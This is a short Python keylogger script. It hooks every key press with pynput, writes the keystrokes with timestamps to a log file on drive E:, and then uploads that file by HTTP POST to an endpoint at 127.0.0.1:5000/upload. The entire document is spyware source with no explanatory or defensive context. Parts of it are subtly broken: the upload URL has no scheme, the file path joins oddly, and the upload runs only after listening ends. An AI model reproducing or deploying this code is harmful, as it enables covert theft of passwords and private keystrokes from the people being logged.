import requests
from pynput.keyboard import Key, Listener
import logging

def press(key):
    logging.info(str(key))

def upload_log(file_path, upload_url):
    try:
        with open(file_path, 'rb') as file:
            files = {'file': file}
            response = requests.post(upload_url, files=files)
            print(response.text)
    except Exception as e:
        print(e)

folder = "E:"
log_file = folder + "log.txt"
upload_url = "127.0.0.1:5000/upload"

logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

with Listener(on_press=press) as listener:
    listener.join()


upload_log(log_file, upload_url)
